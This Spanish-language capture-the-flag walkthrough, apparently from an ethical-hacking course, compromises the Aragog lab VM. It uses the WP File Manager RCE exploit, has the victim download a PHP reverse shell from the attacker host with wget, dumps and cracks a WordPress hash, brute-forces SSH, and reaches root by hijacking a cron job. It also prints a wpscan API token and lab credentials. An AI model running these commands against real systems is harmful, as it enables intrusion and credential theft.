---
title: "🖥️ Máquina: Aragog — Hacking Ético"
aliases:
  - Aragog
  - aragog
  - Máquina Aragog
  - VM Aragog
  - Writeup Aragog
tags:
  - ifct0109
  - hacking-etico
  - vms
  - avanzadas
  - linux
  - ctf
---

# 🖥️ Máquina: Aragog

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Avanzadas  
> **Técnicas trabajadas:** Enumeración web · WordPress (wpscan) · WP File Manager RCE · Reverse Shell PHP · Linpeas · MySQL · Cracking de hashes (john) · Cron Job Hijacking  
> **Descripción:** En esta práctica descubriremos un WordPress con un plugin vulnerable que nos permite ejecutar comandos remotamente. Desde la shell obtenida usaremos linpeas para encontrar credenciales de base de datos y un script de backup, accederemos a MySQL para extraer y crackear un hash, nos moveremos a otro usuario por SSH y escalaremos a root mediante un Cron Job Hijacking sobre un script del que somos propietarios.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.61`
* **`RHOST` (Víctima / Aragog):** Ej. `10.0.0.65`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Aragog tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -sT -p- 10.0.0.65
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -A -p 22,80 10.0.0.65
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!info] Resultado
> SSH y servidor web Apache. La web principal no muestra mucho, solo una imagen. Usamos whatweb y nikto para obtener más información:

```bash
whatweb http://10.0.0.65
```

```text
http://10.0.0.65 [200 OK] Apache[2.4.38], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.0.0.65]
```

```bash
nikto -H http://10.0.0.65
```

> [!info] Resultado
> Nikto no encuentra nada crítico en la raíz. Enumeramos directorios con gobuster:

---

## 🌐 Fase 2: Enumeración web — WordPress

```bash
gobuster dir -r -u http://10.0.0.65 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,htm,html
```

```text
/index.html  (Status: 200) [Size: 97]
/blog        (Status: 200) [Size: 13918]
```

> [!info] Resultado
> Hay un blog. Lo inspeccionamos con whatweb para identificar la tecnología:

```bash
whatweb http://10.0.0.65/blog
```

```text
http://10.0.0.65/blog/ [200 OK] MetaGenerator[WordPress 5.0.12], WordPress[5.0.12]
Title[Blog - Just another WordPress site]
```

> [!info] Resultado
> Es un WordPress 5.0.12. Analizamos sus plugins y vulnerabilidades con wpscan:

```bash
wpscan --url http://10.0.0.65/blog --enumerate --plugins-detection Aggressive --api-token WUFaY4Z9Lf7aUC5Cax02UN1CWIJBeH36g27GF7DpRwc
```

```text
[+] wp-file-manager
 | Version: 6.0
```

```bash
🔵 Alternativa — escanear con Metasploit:
    msfconsole
```

```bash
msf6 > search wordpress_scanner
```

```bash
msf6 > use 0
```

```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 10.0.0.65
```

```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > set TARGETURI /blog
```

```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > run
```

```text
[+] 10.0.0.65 - Detected plugin: wp-file-manager version 6.0
```

> [!info] Resultado
> Ambas herramientas detectan el plugin wp-file-manager versión 6.0. Buscamos exploits conocidos con searchsploit:

---

## 💥 Fase 3: Explotación — WP File Manager RCE

```bash
searchsploit wp-file-manager
```

```text
WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE  | php/webapps/51224.py
```

> [!info] Resultado
> Hay un exploit para versiones hasta 6.9 que permite subir archivos sin autenticación y ejecutar código remoto. La versión instalada es 6.0, por lo que es vulnerable. Lo descargamos:

```bash
searchsploit -m 51224
```

El exploit se usa pasándole la URL del blog y el comando a ejecutar. Verificamos que funciona:

```bash
python3 51224.py http://10.0.0.65/blog/ id
```

```bash
python3 51224.py http://10.0.0.65/blog/ "uname -a"
```

Comprobamos si nc está disponible para usarlo en la reverse shell:

```bash
python3 51224.py http://10.0.0.65/blog/ "which nc"
```

> [!info] Resultado
> nc no está instalado. Comprobamos wget:

```bash
python3 51224.py http://10.0.0.65/blog/ "which wget"
```

```text
/usr/bin/wget
```

> [!info] Resultado
> wget está disponible. La estrategia es: preparar la reverse shell en Kali, servirla con un servidor web Python y hacer que la víctima la descargue con wget.

---

## 🐚 Fase 4: Reverse Shell PHP

Descargamos la reverse shell de pentestmonkey en Kali:

```bash
curl 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php' -o 'monkey.php'
```

Editamos el archivo y cambiamos la IP por la nuestra:

```bash
nano monkey.php
```

```text
$ip = '127.0.0.1';  // CHANGE THIS
```

> [!info] Resultado
> Cambiamos 127.0.0.1 por 10.0.0.61. Guardamos con CTRL+O y salimos con CTRL+X.

Levantamos un servidor web en Kali para servir el archivo:

```bash
python3 -m http.server 8080
```

Dividimos el terminal horizontalmente. En el nuevo terminal hacemos que la víctima descargue el monkey.php desde nuestro servidor:

```bash
python3 51224.py http://10.0.0.65/blog/ "wget http://10.0.0.61:8080/monkey.php"
```

> [!info] Resultado
> Paramos el servidor web con CTRL+C y ponemos Kali en escucha:

```bash
nc -lvnp 1234
```

Ejecutamos el monkey.php en la víctima:

```bash
python3 51224.py http://10.0.0.65/blog/ "php monkey.php"
```

```bash
🔵 Alternativa — activar la shell desde el navegador:
    Primero verificamos en qué directorio se sube el archivo:
    python3 51224.py http://10.0.0.65/blog/ "pwd"
```

```bash
curl http://10.0.0.65/blog/wp-content/plugins/wp-file-manager/lib/files/monkey.php
```

```text
listening on [any] 1234 ...
connect to [10.0.0.61] from (UNKNOWN) [10.0.0.65] ...
```

> [!info] Resultado
> Conexión recibida. Estamos dentro como www-data. Mejoramos la shell antes de continuar:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## 🔍 Fase 5: Reconocimiento con linpeas

Descargamos linpeas desde Kali usando el servidor web que levantaremos de nuevo:

```bash
wget http://10.0.0.61:8080/linpeas.sh
```

```bash
chmod +x linpeas.sh
```

```bash
./linpeas.sh > linpeas.txt
```

Revisamos los resultados más relevantes:

```text
╔══════════╣ Searching passwords in config PHP files
/etc/wordpress/config-default.php:define('DB_PASSWORD', 'mySecr3tPass');
/etc/wordpress/config-default.php:define('DB_USER', 'root');
```

```text
╔══════════╣ Files inside others home (limit 20)
/home/hagrid98/horcrux1.txt
```

```text
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 hagrid98 hagrid98 81 Apr 1 2021 /opt/.backup.sh
```

> [!info] Resultado
> Tres hallazgos importantes:
> · Credenciales de la base de datos WordPress: root:mySecr3tPass.
> · Un archivo horcrux1.txt en el home de hagrid98.
> · Un script de backup en /opt/.backup.sh propiedad de hagrid98, lo que sugiere que se ejecuta como ese usuario o como root mediante cron.

```bash
cat /home/hagrid98/horcrux1.txt
```

```text
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
```

> [!info] Resultado
> Primera flag obtenida: horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}

---

## 🗄️ Fase 6: MySQL — extracción de hash

Accedemos a la base de datos con las credenciales encontradas. Es necesario tener una shell mejorada con pty para que MySQL funcione correctamente:

```bash
mysql -u root -p
```

```text
Enter password: mySecr3tPass
```

```bash
MariaDB [(none)]> show DATABASES;
```

```bash
MariaDB [(none)]> use wordpress;
```

```bash
MariaDB [wordpress]> show tables;
```

```bash
MariaDB [wordpress]> SELECT * FROM wp_users;
```

```text
1 | hagrid98 | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin | hagrid98@localhost.local
```

> [!info] Resultado
> Tenemos el hash de la contraseña de hagrid98. Identificamos el tipo de hash:

```bash
hash-identifier
```

```text
Possible Hashs:
[+] MD5(Wordpress)
```

> [!info] Resultado
> Es un hash de tipo MD5(Wordpress), también conocido como phpass. Lo guardamos y lo crackeamos con john:

```bash
echo -n '$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.' > hash
```

```bash
john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt
```

```text
password123      (?)
```

```bash
🔵 Alternativa — fuerza bruta SSH con ncrack:
    ncrack -u hagrid98 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt ssh://10.0.0.65 -v
```

```text
Discovered credentials on ssh://10.0.0.65:22 'hagrid98' 'password123'
```

---

## 🔑 Fase 7: Acceso SSH como hagrid98

```bash
ssh hagrid98@10.0.0.65
```

```text
hagrid98@10.0.0.65's password: password123
```

```bash
cat horcrux1.txt
```

```text
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
```

---

## 🚀 Fase 8: Escalada de privilegios — Cron Job Hijacking

Descargamos pspy64s para monitorizar procesos en tiempo real sin privilegios de root y detectar tareas programadas:

```bash
wget -c https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
```

```bash
chmod +x pspy64s
```

```bash
./pspy64s
```

```text
19:20:01 CMD: UID=0  PID=16657  | /bin/sh -c bash -c "/opt/.backup.sh"
```

> [!info] Resultado
> UID=0 significa que es root quien ejecuta el script cada minuto. El script que linpeas había marcado es /opt/.backup.sh y es propiedad de hagrid98:

```bash
ls -la /opt/.backup.sh
```

```text
-rwxr-xr-x 1 hagrid98 hagrid98 81 Apr 1 2021 /opt/.backup.sh
```

> [!info] Resultado
> Al ser hagrid98 el propietario del archivo tenemos permiso de escritura sobre él. Paramos pspy con CTRL+C. Añadimos una reverse shell al final del script y esperamos a que cron la ejecute como root.

En una nueva terminal de Kali nos ponemos a la escucha:

```bash
nc -lvnp 9003
```

Añadimos la reverse shell al script de backup:

```bash

```

> [!info] Resultado
> Esperamos como máximo un minuto. Cuando cron ejecute el script como root recibiremos la conexión en Kali.

```text
connect to [10.0.0.61] from (UNKNOWN) [10.0.0.65] ...
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

```text
horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
```

> [!info] Resultado
> Segunda flag obtenida: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
